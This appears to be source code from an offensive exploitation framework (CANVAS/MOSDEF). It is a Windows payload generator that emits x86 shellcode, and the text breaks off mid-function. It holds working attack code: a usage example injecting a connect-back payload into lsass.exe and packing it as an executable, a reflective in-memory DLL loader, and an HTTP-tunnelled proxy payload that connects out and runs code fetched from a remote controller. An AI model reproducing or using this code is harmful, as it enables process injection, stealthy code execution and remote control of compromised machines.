#! /usr/bin/env python

# a more respectful payload generator for win32

from basecode import basecode
from basecode import s_to_push
from MOSDEF import mosdef
from MOSDEF import pelib
from exploitutils import *
import struct
import socket
import random
import time

import canvasengine
import logging

from engine import CanvasConfig

USAGE = """
To create a simple file with the shellcode its quite simple:

import shellcode.standalone.windows.payloads as payloads
p = payloads.payloads()
localhost = "172.16.193.1"
localport = 5555
sc = p.injectintoprocess( localhost, localport, target= "lsass.exe",
load_winsock = True )
sc = p.assemble(sc)

print "Shellcode size: %x" % len(sc)
myPElib = pelib.PElib()
exe = myPElib.createPEFileBuf(sc, gui=True)
file = open('test.exe', 'wb+')
file.write(exe)
file.close()
"""

class payloads:
    def __init__(self, VirtualProtect=True, VistaCompat=True, module=None, dll=False, dll_exits=True):
        self.vprotect     = VirtualProtect
        self.vista_compat = VistaCompat
        self.module       = module # current module using the payload generator
        self.dll          = dll

    def get_basecode(self, **args):
        if self.vprotect: args["VirtualProtect"] = True
        if self.dll: args["dll"] = True
        return basecode(**args)

    def assemble(self, code):
        """
        just a little convenience callthrough to mosdef.assemble
        """
        return mosdef.assemble(code, 'X86')

    def dll_from_mem(self, dll_data, use_dll_asm = ''):
        """
        A DLL from memory loading payload

        This is a MOSDEF ASM implementation of Joachim Bauch's reference C code

        To actually do something with your loaded dll, set your desired ASM into
        use_dll_asm. You have the "memory_getprocaddress" function available
        to resolve exported functions, the module handle lives in eax on entry
        of this stub.

        E.g. to resolve and use function "Foo" from a mem-loaded dll you would set
        use_dll_asm to something like (remember to newline seperate):

            // "Foo"
            pushl $0x006F6F46
            movl %esp,%esi
            pushl %esi // name
            pushl %eax // handle to dll
            call memory_getprocaddress
            // eax is NULL or resolved address
            pushl $3
            pushl $2
            pushl $1
            call *%eax  // call Foo(1, 2 3)
            popl %ecx   // eat the "Foo" bytes

        NOTE: KEEP THIS STUB STACK NEUTRAL, AFTER ITS DONE THE MAIN PAYLOAD WILL
        EXPECT TO BE ABLE TO RETURN AFTER THE STUB HAS EXCUTED

        """
        codegen = self.get_basecode()
        codegen.find_function('ntdll.dll!rtlallocateheap')
        codegen.find_function('ntdll.dll!rtlreallocateheap')
        codegen.find_function('kernel32.dll!loadlibrarya')
        codegen.find_function('kernel32.dll!getprocaddress')
        codegen.find_function('kernel32.dll!virtualalloc')
        codegen.find_function('kernel32.dll!virtualprotect')
        codegen.find_function('kernel32.dll!virtualfree')
        codegen.find_function('kernel32.dll!isbadreadptr')
        codegen.find_function('kernel32.dll!getprocessheap')
        codegen.find_function('kernel32.dll!writeprocessmemory')

        NOTES = """
...
typedef struct _IMAGE_DOS_HEADER
{
     WORD e_magic;
     WORD e_cblp;
     WORD e_cp;
     WORD e_crlc;
     WORD e_cparhdr;
     WORD e_minalloc;
     WORD e_maxalloc;
     WORD e_ss;
     WORD e_sp;
     WORD e_csum;
     WORD e_ip;
     WORD e_cs;
     WORD e_lfarlc;
     WORD e_ovno;
     WORD e_res[4];
     WORD e_oemid;
     WORD e_oeminfo;
     WORD e_res2[10];
     LONG e_lfanew;
} IMAGE_DOS_HEADER, *PIMAGE_DOS_HEADER;
...
typedef struct _IMAGE_NT_HEADERS {
  DWORD                 Signature;
  IMAGE_FILE_HEADER     FileHeader;
  IMAGE_OPTIONAL_HEADER OptionalHeader;
} IMAGE_NT_HEADERS, *PIMAGE_NT_HEADERS;
...
typedef struct _IMAGE_FILE_HEADER {
  WORD  Machine;
  WORD  NumberOfSections;
  DWORD TimeDateStamp;
  DWORD PointerToSymbolTable;
  DWORD NumberOfSymbols;
  WORD  SizeOfOptionalHeader;
  WORD  Characteristics;
} IMAGE_FILE_HEADER, *PIMAGE_FILE_HEADER;
...
typedef struct _IMAGE_OPTIONAL_HEADER {
  WORD                 Magic;
  BYTE                 MajorLinkerVersion;
  BYTE                 MinorLinkerVersion;
  DWORD                SizeOfCode;
  DWORD                SizeOfInitializedData;
  DWORD                SizeOfUninitializedData;
  DWORD                AddressOfEntryPoint;
  DWORD                BaseOfCode;
  DWORD                BaseOfData;
  DWORD                ImageBase;
  DWORD                SectionAlignment;
  DWORD                FileAlignment;
  WORD                 MajorOperatingSystemVersion;
  WORD                 MinorOperatingSystemVersion;
  WORD                 MajorImageVersion;
  WORD                 MinorImageVersion;
  WORD                 MajorSubsystemVersion;
  WORD                 MinorSubsystemVersion;
  DWORD                Win32VersionValue;
  DWORD                SizeOfImage;
  DWORD                SizeOfHeaders;
  DWORD                CheckSum;
  WORD                 Subsystem;
  WORD                 DllCharacteristics;
  DWORD                SizeOfStackReserve;
  DWORD                SizeOfStackCommit;
  DWORD                SizeOfHeapReserve;
  DWORD                SizeOfHeapCommit;
  DWORD                LoaderFlags;
  DWORD                NumberOfRvaAndSizes;
  IMAGE_DATA_DIRECTORY DataDirectory[IMAGE_NUMBEROF_DIRECTORY_ENTRIES];
} IMAGE_OPTIONAL_HEADER, *PIMAGE_OPTIONAL_HEADER;
...
typedef struct _IMAGE_DATA_DIRECTORY {
  DWORD VirtualAddress;
  DWORD Size;
} IMAGE_DATA_DIRECTORY, *PIMAGE_DATA_DIRECTORY;
...
typedef struct {
    PIMAGE_NT_HEADERS headers;
    unsigned char *codeBase;
    HMODULE *modules;
    int numModules;
    int initialized;
} MEMORYMODULE, *PMEMORYMODULE;
...
typedef struct _IMAGE_SECTION_HEADER {
  BYTE  Name[IMAGE_SIZEOF_SHORT_NAME];
  union {
    DWORD PhysicalAddress;
    DWORD VirtualSize;
  } Misc;
  DWORD VirtualAddress;
  DWORD SizeOfRawData;
  DWORD PointerToRawData;
  DWORD PointerToRelocations;
  DWORD PointerToLinenumbers;
  WORD  NumberOfRelocations;
  WORD  NumberOfLinenumbers;
  DWORD Characteristics;
} IMAGE_SECTION_HEADER, *PIMAGE_SECTION_HEADER;
...
typedef struct _IMAGE_DATA_DIRECTORY {
  DWORD VirtualAddress;
  DWORD Size;
} IMAGE_DATA_DIRECTORY, *PIMAGE_DATA_DIRECTORY;
...
        """

        codegen.main += """
        call dll_from_mem_main
        """

        # do whatever you want to do after the DLL loading here
        # memory_getprocaddress is available to resolve exported
        # functions ... eax has the handle to the module
        #
        # FARPROC memory_getprocaddress(HMODULE handle, char *name)
        codegen.main += "\n" + use_dll_asm + "\nret\n"

        codegen.main += """
        // functions go here

    memory_load_library:

        pushl %ebx
        pushl %edi // +4
        pushl %esi // +8

        movl 0x10(%esp),%esi  // dos_header
        movl 0x3c(%esi),%edi
        addl %esi,%edi       // old_header = &data[dos_header->e_lfanew]

        pushl $0x4           // PAGE_READWRITE
        pushl $0x2000        // MEM_RESERVE
        pushl 0x50(%edi)     // old_header->OptionalHeader.SizeOfImage
        pushl 0x34(%edi)     // old_header->OptionalHeader.ImageBase
        call *VIRTUALALLOC-getpcloc(%ebp)

        test %eax,%eax
        jnz code_allocated

        // alloc failed, try non-fixed
        pushl $0x4           // PAGE_READWRITE
        pushl $0x2000        // MEM_RESERVE
        pushl 0x50(%edi)     // old_header->OptionalHeader.SizeOfImage
        pushl $0x0           // NULL
        call *VIRTUALALLOC-getpcloc(%ebp)

    code_allocated:

        pushl %eax // +12, code

        // XXX: test eax for NULL

        // get memory for MEMORYMODULE result
        call *GETPROCESSHEAP-getpcloc(%ebp)
        pushl $0x14
        pushl $0x0
        pushl %eax
        call *RTLALLOCATEHEAP-getpcloc(%ebp)

        pushl %eax // +16, result

        movl 0x4(%esp),%ebx // code
        movl %ebx,0x4(%eax) // result->codeBase = code
        movl $0,0xc(%eax)   // result->numModules = 0
        movl $0,0x8(%eax)   // result->modules = NULL
        movl $0,0x10(%eax)  // result->initialized = 0

        pushl $0x4          // PAGE_READWRITE
        pushl $0x1000       // MEM_COMMIT
        pushl 0x50(%edi)    // old_header->OptionalHeader.SizeOfImage
        pushl %ebx          // code
        call *VIRTUALALLOC-getpcloc(%ebp)

        pushl $0x4          // PAGE_READWRITE
        pushl $0x1000       // MEM_COMMIT
        pushl 0x54(%edi)    // old_header->OptionalHeader.SizeOfHeaders
        pushl %ebx          // code
        call *VIRTUALALLOC-getpcloc(%ebp)

        pushl %eax // +20, headers

        // use writeprocessmemory as a memcpy
        movl 0x54(%edi),%eax
        add 0x3c(%esi),%eax // dos_header->e_lfanew + old_header->OptionalHeader.SizeofHeaders

        movl (%esp),%edx
        pushl $0x0          // NULL
        pushl %eax          // size
        pushl %esi          // dos_header
        pushl %edx          // headers
        pushl $-1           // pseudo handle to self
        call *WRITEPROCESSMEMORY-getpcloc(%ebp)

        movl 0x4(%esp),%edx    // result
        movl (%esp),%eax        // headers
        addl 0x3c(%esi),%eax    // headers + dos_header->e_lfanew
        movl %ebx,0x34(%eax)    // result->headers->OptionalHeader.ImageBase = code
        movl %eax,(%edx)        // result->headers = &headers[dos_header->e_lfanew]

        // CopySections
        xorl %ebx,%ebx
        xorl %ecx,%ecx
        movw 0x6(%eax),%cx     // module->headers->FileHeader.NumberOfSections
                                // resolve section, module->headers + offset of optionalheader (0x18) + FileHeader.SizeOfOptionalHeader
        movw 0x14(%eax),%bx
        addl %eax,%ebx
        addl $0x18,%ebx         // ebx section

        // ecx count has been set to NumberOfSections
        // ebx has initial section pointer
        // sizeof(IMAGE_SECTION_HEADER) == 0x28

        pushl %edx              // +24, module

    copy_sections:
        movl 0x10(%ebx),%eax    // section->SizeOfRawData
        test %eax,%eax

        // check for unitialized data to commit
        jnz commit_section

        movl 0x38(%edi),%eax    // old_headers->OptionalHeader.SectionAlignment
        test %eax,%eax
        jz section_loop

        popl  %edx
        pushl %edx
        pushl %ecx
        pushl $0x4              // PAGE_READWRITE
        pushl $0x1000           // MEM_COMMIT
        pushl %eax              // size
        movl 0x4(%edx),%eax
        addl 0xc(%ebx),%eax     // codeBase + section->VirtualAddress
        pushl %eax
        call *VIRTUALALLOC-getpcloc(%ebp)
        popl %ecx
        movl %eax,0x8(%ebx)     // section->Misc.PhysicalAddress = dest

        // memset to 0 the dest region
        pushl %ecx
        pushl %edi
        movl 0x38(%edi),%ecx
        movl %eax,%edi
        cld
        xorl %eax,%eax
        rep stosb
        popl %edi
        popl %ecx

        jmp section_loop

    commit_section:

        popl %edx
        pushl %edx
        pushl %ecx
        pushl $0x4          // PAGE_READWRITE
        pushl $0x1000       // MEM_COMMIT
        pushl 0x10(%ebx)    // section->SizeofRawData
        movl 0x4(%edx),%eax
        addl 0xc(%ebx),%eax // codeBase + section->VirtualAddress
        pushl %eax
        call *VIRTUALALLOC-getpcloc(%ebp)
        popl %ecx

        movl %eax,0x8(%ebx) // section->Misc.PhysicalAddress = dest

        // memcpy the section data over
        pushl %ecx
        pushl $0            // NULL
        pushl 0x10(%ebx)    // section->SizeofRawData
        movl 0x14(%ebx),%edx
        addl %esi,%edx
        pushl %edx          // data + section->PointerToRawData
        pushl %eax          // dest
        pushl $-1
        call *WRITEPROCESSMEMORY-getpcloc(%ebp)
        popl %ecx

    section_loop:

        addl $0x28,%ebx     // section ++
        loop copy_sections

        movl 0xc(%esp),%ebx     // code
        pushl %esi
        pushl %edi
        movl 0x34(%edi),%eax
        subl %eax,%ebx          // code - old_header->OptionalHeader.ImageBase
        test %ebx,%ebx
        jz end_of_relocation

        // ebx is delta
    perform_base_relocation:

        movl 0x8(%esp),%eax
        movl (%eax),%eax        // module->headers
        leal 0xa0(%eax),%eax    // &(module)->headers->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC]

        // eax is directory
        pushl %eax
        movl 4(%eax),%eax
        test %eax,%eax
        popl %eax               // directory
        jz end_of_relocation    // directory->Size > 0 ?

        // eax is directory
        // 0x8(%esp) module
        movl 0x8(%esp),%esi
        movl 0x4(%esi),%esi     // codeBase
        addl (%eax),%esi        // codeBase + directory->VirtualAddress

    outer_relocation_loop:
        // esi is relocation
        movl (%esi),%eax
        test %eax,%eax
        jz end_of_relocation

        movl 0x8(%esp),%ecx
        movl 0x4(%ecx),%edi     // codeBase
        addl (%esi),%edi        // codeBase + relocation->VirtualAddress

        pushl %esi

        // edi is dest, IMAGE_SIZEOF_BASE_LOCATION == 8, %esi is relocation
        movl 4(%esi),%ecx       // relocation->SizeOfBlock
        subl $8,%ecx            // - IMAGE_SIZEOF_BASE_RELOCATION
        addl $8,%esi            // relInfo == relocation + IMAGE_SIZEOF_BASE_RELOCATION
    inner_relocation_loop:
        test %ecx,%ecx
        jz end_of_outer_relocation_loop

        xorl %eax,%eax
        movw (%esi),%ax
        shrl $12,%eax
        // IMAGE_REL_BASED_ABSOLUTE == 0, skipped
        // IMAGE_REL_BASED_HIGHLOW == 3, handled
        // anything else is unknown
        cmpl $3,%eax
        jnz end_of_inner_relocation_loop

        movw (%esi),%ax
        andl $0xfff,%eax    // low 12 bits is offset
        addl %edi,%eax      // dest + offset
        addl %ebx,(%eax)    // *patchAddrHL += delta

    end_of_inner_relocation_loop:
        subl $2,%ecx
        addl $2,%esi
        jmp inner_relocation_loop

    end_of_outer_relocation_loop:
        popl %esi
        addl 4(%esi),%esi
        jmp outer_relocation_loop

    end_of_relocation:
        popl %edi
        popl %esi

    build_import_table:
        // (%esp) module
        movl (%esp),%eax
        movl (%eax),%eax
        leal 0x80(%eax),%eax    // &(module)->headers->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT]
        pushl %esi
        pushl %edi
        pushl %eax              // directory
        movl 4(%eax),%eax
        test %eax,%eax
        popl %eax
        jz end_of_build_import_table    // directory->Size > 0 ?

        movl 0x8(%esp),%esi
        movl 0x4(%esi),%esi     // codeBase
        addl (%eax),%esi        // codeBase + directory->VirtualAddress

        // esi importDescriptor, sizeof() == 20
    build_import_table_loop:
        pushl $0x14
        pushl %esi
        call *ISBADREADPTR-getpcloc(%ebp)
        test %eax,%eax
        jnz end_of_build_import_table
        movl 0xc(%esi),%eax     // importDesc->Name
        test %eax,%eax
        jz end_of_build_import_table

        movl 0x8(%esp),%edi
        movl 0x4(%edi),%edi     // codeBase
        addl %edi,%eax          // codeBase + importDesc->Name

        pushl %eax
        call *LOADLIBRARYA-getpcloc(%ebp)
        cmpl $-1,%eax
        jz debug // XXX

        pushl %eax              // handle
        movl 0xc(%esp),%ebx     // module
        movl 0xc(%ebx),%eax     // module->numModules
        incl %eax
        movl $4,%ecx
        mul %ecx
        pushl %eax
        pushl 0x8(%ebx)
        call myrealloc
        test %eax,%eax
        jz debug // XXX

        movl %eax,0x8(%ebx)     // module->modules update
        movl 0xc(%ebx),%ecx     // numModules
        incl 0xc(%ebx)          // numModules ++
        popl %ebx               // handle
        movl %ebx,(%eax,%ecx,4)

        // edi codebase, esi importdescriptor
        movl (%esi),%ecx
        test %ecx,%ecx          // importDesc->OriginalFirstThunk ?
        jz no_hint_table
        addl %edi,%ecx          // ecx, thunkRef
        movl 0x10(%esi),%edx    // importDesc->FirstThunk
        addl %edi,%edx          // edx, funcRef
        jmp end_of_ref_setup
    no_hint_table:
        movl 0x10(%esi),%edx
        addl %edi,%edx          // edx, funcRef
        movl %edx,%ecx          // ecx, thunkRef
    end_of_ref_setup:

        // edi codebase, edx funcRef, ecx thunkRef, ebx handle
    build_import_table_inner_loop:
        movl (%ecx),%eax
        test %eax,%eax
        jz end_of_build_import_table_inner_loop

        andl $0x80000000,%eax
        test %eax,%eax
        jz no_ordinal

    resolve_import:
        movl (%ecx),%eax
        andl $0xffff,%eax
        pushl %ecx
        pushl %edx
        pushl %eax
        pushl %ebx
        call *GETPROCADDRESS-getpcloc(%ebp)
        popl %edx
        popl %ecx
        movl %eax,(%edx)
        jmp resolve_import_end

    no_ordinal:
        movl (%ecx),%eax
        addl %edi,%eax
        addl $2,%eax
        pushl %ecx
        pushl %edx
        pushl %eax
        pushl %ebx
        call *GETPROCADDRESS-getpcloc(%ebp)
        popl %edx
        popl %ecx
        movl %eax,(%edx)

    resolve_import_end:
        test %eax,%eax
        jz debug

        addl $4,%edx
        addl $4,%ecx
        jmp build_import_table_inner_loop

    end_of_build_import_table_inner_loop:
        addl $0x14,%esi
        jmp build_import_table_loop

    end_of_build_import_table:

        // finalize the sections, orig edi and esi still saved on stack

        // 0x8(%esp) module
        xorl %ebx,%ebx
        xorl %ecx,%ecx
        movl 0x8(%esp),%eax
        movl (%eax),%eax    // headers
        movw 0x6(%eax),%cx // numberOfSections
        movw 0x14(%eax),%bx
        addl %eax,%ebx
        addl $0x18,%ebx     // section
    finalize_sections:

        // ebx section, ecx numberofsections

        // build two 2x2 multi-dimensional arrays, 1 for executable, 1 for non-executable permissions

        // executable
        pushl $0x40 //PAGE_EXECUTE_READWRITE
        pushl $0x20 //PAGE_EXECUTE_READ
        pushl $0x80 //PAGE_EXECUTE_WRITECOPY
        pushl $0x10 //PAGE_EXECUTE

        // non-executable
        pushl $0x04 //PAGE_READWRITE
        pushl $0x02 //PAGE_READONLY
        pushl $0x08 //PAGE_WRITECOPY
        pushl $0x01 //PAGE_NOACCESS

        // 3 tracking variables, x, r , w
    finalize_sections_loop:
        xorl %eax,%eax
        pushl %eax // w
        pushl %eax // r
        pushl %eax // x

        movl 0x24(%ebx),%eax    // section->Characteristics
        andl $0x20000000,%eax   // IMAGE_SCN_MEM_EXECUTE
        movl %eax,(%esp)         // x
        movl 0x24(%ebx),%eax
        andl $0x40000000,%eax   // IMAGE_SCN_MEM_READ
        movl %eax,4(%esp)         // r
        movl 0x24(%ebx),%eax
        andl $0x80000000,%eax   // IMAGE_SCN_MEM_WRITE
        movl %eax,8(%esp)        // w
        movl 0x24(%ebx),%eax    // section->Characteristics
        andl $0x02000000,%eax   // IMAGE_SCN_MEM_DISCARDABLE
        jz no_discard
        pushl %ecx
        pushl $0x1000           // MEM_COMMIT
        pushl 0x10(%ebx)        // section->SizeOfRawData
        pushl 0x8(%ebx)         // section->Misc.PhysicalAddress
        call *VIRTUALFREE-getpcloc(%ebp)
        popl %ecx
    no_discard:
        // calculate offset into array for right flags
        leal 12(%esp),%esi
        popl %eax               // x
        test %eax,%eax
        jz non_exec
        addl $0x10,%esi
    non_exec:
        popl %eax               // r
        test %eax,%eax
        jz non_read
        addl $0x8,%esi
    non_read:
        popl %eax               // w
        test %eax,%eax
        jz non_write
        addl $0x4,%esi
    non_write:
        // grab the protection flags
        movl (%esi),%edi
        // eat the arrays
        addl $0x20,%esp

        movl 0x24(%ebx),%eax
        andl $0x04000000,%eax   // IMAGE_SCN_MEM_NOT_CACHED
        jz no_not_cached
        orl $0x200,%edi         // protect |= PAGE_NOCACHE
    no_not_cached:

        movl 0x10(%ebx),%eax
        test %eax,%eax
        jnz no_init_data_check

        movl 0x24(%ebx),%eax
        andl $0x00000040,%eax
        jz no_initialized_data

        movl 0x8(%esp),%eax     // module
        movl (%eax),%eax        // module->headers
        movl 0x20(%eax),%eax    // module->headers->OptionalHeader.SizeOfInitializedData
        jmp no_init_data_check

    no_initialized_data:
        movl 0x24(%ebx),%eax
        andl $0x00000080,%eax
        jz no_init_data_check
        movl 0x8(%esp),%eax
        movl (%eax),%eax
        movl 0x24(%eax),%eax    // module->headers->OptionalHeader.SizeOfUninitializedData

    no_init_data_check:
        // size is eax
        test %eax,%eax
        jz no_virtual_protect

        pushl %ecx
        pushl %eax
        movl %esp,%ecx
        pushl %ecx              // &oldProtect
        pushl %edi              // edi
        //XXX: pushl 0x10(%ebx)        // section->SizeOfRawData ... I believe this is a bug in the C code
        pushl %eax              // size
        pushl 0x8(%ebx)         // section->Misc.PhysicalAddress
        call *VIRTUALPROTECT-getpcloc(%ebp)
        popl %eax
        popl %ecx

    no_virtual_protect:
        addl $0x28,%ebx
        // offset too large for loop
        // loop finalize_sections
        decl %ecx
        test %ecx,%ecx
        jnz finalize_sections

        // restore the saved edi and esi
        popl %edi   // old_header
        popl %esi   // dos_header

        popl %eax               // module
        popl %ecx               // headers ... discard
        movl (%eax),%eax        // module->headers
        movl 0x28(%eax),%eax    // module->headers->OptionalHeader.AddressOfEntryPoint
        test %eax,%eax
        jz memory_load_library_exit

        // we should probably super duper extra double check that we have a valid entry pointer
        movl 0x4(%esp),%edi     // code
        addl %eax,%edi          // code + module->headers->OptionalHeader.AddressOfEntryPoint
        pushl $0
        pushl $1                // DLL_PROCESS_ATTACH
        pushl 0x4(%esp)         // code
        call *%edi
        test %eax,%eax
        jz memory_load_library_exit
        movl (%esp),%eax               // result
        movl $1,0x10(%eax)      // result->initialized = 1 (module and result are the same)

    memory_load_library_exit:
        popl %ecx   // result .. discard
        popl %ecx   // code .. discard
        popl %esi   // restore non-volatile
        popl %edi   // restore non-volatile
        popl %ebx   // restore non-volatile
        ret $4      // return NULL or result

    get_dll_data:
        leal DLL_DATA-getpcloc(%ebp),%eax
        ret

        // (ptr, size)
    myrealloc:
        movl 8(%esp),%eax
        pushl %eax // size
        movl 8(%esp),%eax
        pushl %eax // ptr ... or 0, acts as both
        test %eax,%eax
        jz no_realloc
        pushl $0   // 0 push for realloc
        call *GETPROCESSHEAP-getpcloc(%ebp)
        pushl %eax
        call *RTLREALLOCATEHEAP-getpcloc(%ebp)
        ret $8
    no_realloc:
        call *GETPROCESSHEAP-getpcloc(%ebp)
        push %eax
        call *RTLALLOCATEHEAP-getpcloc(%ebp)
        ret $8

        // a custom getprocaddress so you can get to function exports for
        // the memory loaded dll
        //  ...(module, name)
    memory_getprocaddress:
        pushl %ebx
        pushl %esi
        pushl %edi

        // 0x10(%esp) module
        // 0x14(%esp) name
        movl 0x10(%esp),%eax
        movl (%eax),%eax
        leal 0x78(%eax),%eax    // &(module)->headers->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT]

        // eax is directory
        pushl %eax
        movl 4(%eax),%eax
        test %eax,%eax          // directory->Size > 0 ?
        popl %eax
        jz end_of_memory_getprocaddress

        movl 0x10(%esp),%esi
        movl 0x4(%esi),%esi     // codeBase
        addl (%eax),%esi        // codeBase + directory->VirtualAddress

        // esi is exports
        movl 0x14(%esi),%eax    // numberOfFunctions
        test %eax,%eax
        jz end_of_memory_getprocaddress
        movl 0x18(%esi),%ecx    // numberOfNames
        test %ecx,%ecx
        jz end_of_memory_getprocaddress

        // %ecx is number of names
        // %esi is exports
        movl 0x10(%esp),%ebx
        movl 4(%ebx),%ebx       // codeBase

        movl 0x20(%esi),%eax
        addl %ebx,%eax          // codebase + exports->AddressOfNames
        movl 0x24(%esi),%edx
        addl %ebx,%edx          // codebase + exports->AddressOfNameOrdinals

        pushl %esi
    resolve_ordinal:
        movl 0x18(%esp),%esi    // name
        movl (%eax),%edi
        addl %ebx,%edi          // codeBase + *(nameRef)

        pushl %ecx
        pushl %eax
        xorl %eax,%eax
        xorl %ecx,%ecx
        cld
    my_strlen:
        lodsb
        incl %ecx
        cmpb $0,%al
        jnz my_strlen
        subl %ecx,%esi

    my_strcmp:
        cmpsb
        jnz my_strcmp_done
        loop my_strcmp
    my_strcmp_done:
        test %ecx,%ecx          // if count left, not equal
        popl %eax
        popl %ecx
        jz found_ordinal
        addl $2,%edx            // ordinal ++
        addl $4,%eax            // nameRef ++
        loop resolve_ordinal
        // this is only hit when ordinal is not found
        xorl %eax,%eax
        popl %esi
        jmp end_of_memory_getprocaddress

    found_ordinal:
        popl %esi
        xorl %edi,%edi
        movw (%edx),%di         // ordinal idx
        movl 0x14(%esi),%eax    // numberOfFunctions
        cmpl %eax,%edi
        jl valid_idx
        xorl %eax,%eax
        jmp end_of_memory_getprocaddress

    valid_idx:
        // ebx codebase
        // edi index
        // esi exports
        movl %edi,%eax
        movl $4,%ecx
        mul %ecx
        movl 0x1c(%esi),%edi
        addl %eax,%edi
        addl %ebx,%edi
        movl (%edi),%eax
        addl %ebx,%eax  // (codeBase + (*(DWORD *) (codeBase + exports->AddressOfFunctions + (idx*4))))

    end_of_memory_getprocaddress:
        popl %edi
        popl %esi
        popl %ebx

        // eax has NULL or function address
        ret $8


    debug:
        int3

        """

        codegen.main += """
    dll_from_mem_main:
        call get_dll_data
        push %eax
        call memory_load_library
        ret
        """

        # we cant use a global because they sit in front of our code
        # which messes with our vprotect page stub
        codegen.main += "DLL_DATA:\n"
        for c in dll_data:
            codegen.main += '.byte 0x%.2x\n' % ord(c)

        return codegen.get()


    def http_proxy(self, host, port, load_winsock=True, SSL=False):
        """
        A HTTP -> TCP MOSDEF proxy payload
        """

        codegen = self.get_basecode()
        if self.vista_compat: codegen.vista_compat=True

        # ws2_32.dll
        codegen.find_function('kernel32.dll!loadlibrarya')

        if load_winsock == True:
            codegen.load_library('ws2_32.dll')
            codegen.find_function('ws2_32.dll!wsastartup')

        codegen.find_function('ws2_32.dll!socket')
        codegen.find_function('ws2_32.dll!connect')
        codegen.find_function('ws2_32.dll!bind')
        codegen.find_function('ws2_32.dll!listen')
        codegen.find_function('ws2_32.dll!accept')
        codegen.find_function('ws2_32.dll!send')
        codegen.find_function('ws2_32.dll!recv')
        codegen.find_function('ws2_32.dll!select')
        codegen.find_function('ws2_32.dll!closesocket')

        # wininet.dll
        codegen.load_library('wininet.dll')
        codegen.find_function('wininet.dll!internetopena')
        codegen.find_function('wininet.dll!internetopenurla')
        codegen.find_function('wininet.dll!internetreadfile')
        codegen.find_function('wininet.dll!internetclosehandle')
        codegen.find_function('wininet.dll!internetconnecta')
        codegen.find_function('wininet.dll!httpsendrequesta')
        codegen.find_function('wininet.dll!httpaddrequestheadersa')
        codegen.find_function('wininet.dll!httpopenrequesta')
        codegen.find_function('wininet.dll!internetsetoptiona')
        codegen.find_function('wininet.dll!httpqueryinfoa')
        codegen.find_function('wininet.dll!httpendrequesta')

        # kernel32.dll
        codegen.find_function('kernel32.dll!createthread')
        codegen.find_function('kernel32.dll!getexitcodethread')
        codegen.find_function('kernel32.dll!exitthread')
        codegen.find_function('kernel32.dll!virtualalloc')
        codegen.find_function('kernel32.dll!virtualfree')
        codegen.find_function('kernel32.dll!terminatethread')
        codegen.find_function('kernel32.dll!resumethread')
        codegen.find_function('kernel32.dll!disablethreadlibrarycalls')

        # modes and types (+ unique id)

        # XXX: if we have a defined engine, query it for the index id and payload id
        if self.module and hasattr(self.module, 'engine') == True and self.module.engine:
            mosdef_type = self.module.engine.getMosdefType(canvasengine.WIN32MOSDEF_INTEL)
            mosdef_id = self.module.engine.getNewMosdefID(self.module)
            x_id = '0x%.8x,0x%.8x' % (mosdef_type, mosdef_id)
        else:
            x_id = '0x%.8x,0x%.8x' % (0, time.time()) # win32 mosdef is index 0 for mosdef type

        #print "[+] client id: %s" % x_id

        # size is not so much of an issue with clientside payloads ...
        codegen._globals.addString('MODE_PUSH_MORE', \
                                   'X-mode: push\r\nX-type: more\r\nX-id: %s\r\n' % x_id)
        codegen._globals.addString('MODE_PUSH_LAST', \
                                   'X-mode: push\r\nX-type: last\r\nX-id: %s\r\n' % x_id)
        codegen._globals.addString('MODE_POP', \
                                   'X-mode: pop\r\n\r\nX-id: %s\r\n' % x_id)

        # wininet control data
        codegen._globals.addString('MOZILLA', 'Mozilla')
        codegen._globals.addString('CLIENTID', '/') # XXX: old terminology not clientid
        codegen._globals.addString('POST', 'POST')
        codegen._globals.addDword('HTTPPORT', val = port)
        codegen._globals.addString('HTTPHOST', host)

        if load_winsock == True:
            # wsastartup
            codegen.main += """
            subl $0x200,%esp
            pushl %esp
            xorl %ebx,%ebx
            movb $0x1,%bh
            movb $0x1,%bl
            pushl %ebx
            call *WSASTARTUP-getpcloc(%ebp)
            addl $0x200,%esp
            """
        codegen._globals.addDword('FDSPOT_BIND')
        codegen._globals.addDword('FDSPOT_CNCT')
        codegen._globals.addDword('MOSDEF_PAGE')
        codegen._globals.addDword('HTTPHANDLE')
        codegen._globals.addDword('HCONNECT')
        codegen._globals.addDword('HREQUEST')
        codegen._globals.addDword('MOSDEFHANDLE')

        #typedef struct fd_set {
        #   u_int  fd_count;
        #   SOCKET fd_array[FD_SETSIZE];
        #} fd_set;

        codegen.main += """
        // thread off the mosdef bind
        xorl %eax,%eax
        pushl %eax
        pushl %eax
        pushl %ebp
        leal bind_mosdef-getpcloc(%ebp),%esi
        pushl %esi
        pushl %eax
        pushl %eax
        call *CREATETHREAD-getpcloc(%ebp)
        movl %eax,MOSDEFHANDLE-getpcloc(%ebp)     // Save thread handle
        xorl %eax, %eax
        """

        # In the case of this payload being used inside a DLL, we need to follow
        # DllMain conventions and cleanly return from 'main', saving/restoring
        # all volatile registers (see basecode).

        if self.dll:
            codegen.main += """
            movl $0x00000001, %eax
            ret
            """
        else:
            codegen.main += """
            pushl %eax
            // 0xfffffffe = current thread
            pushl $0xfffffffe
            call *TERMINATETHREAD-getpcloc(%ebp)
            """

        codegen.main += """
        // connect to bound localhost mosdef
        connect_mosdef:
        movl  4(%esp), %ebp
        pushl $0x6
        pushl $0x1
        pushl $0x2
        cld
        call *SOCKET-getpcloc(%ebp)
        movl %eax,FDSPOT_CNCT-getpcloc(%ebp)
        xorl %ebx,%ebx
        pushl %ebx
        pushl %ebx
        pushl $REPLACEHOST // host
        pushl $REPLACEPORT // port
        movl %esp,%ecx
        pushl $0x10
        pushl %ecx
        pushl %eax
        call *CONNECT-getpcloc(%ebp)
        cmpl $-1,%eax
        je exit_mosdef

        // alloc mosdef pages
        pushl $0x40
        pushl $0x1000
        pushl $0x10000
        pushl $0
        call *VIRTUALALLOC-getpcloc(%ebp)
        movl %eax,MOSDEF_PAGE-getpcloc(%ebp)

        // main HTTP handle (do not loop only need 1 instance)
        xorl %eax,%eax
        pushl %eax
        pushl %eax
        pushl %eax
        pushl %eax
        leal MOZILLA-getpcloc(%ebp),%esi
        pushl %esi
        call *INTERNETOPENA-getpcloc(%ebp)
        movl %eax,HTTPHANDLE-getpcloc(%ebp)

        // this loops until exit
        select_mosdef_and_http:


        // Check if mosdef thread is still alive
        pushl $0
        pushl %esp
        pushl MOSDEFHANDLE-getpcloc(%ebp)
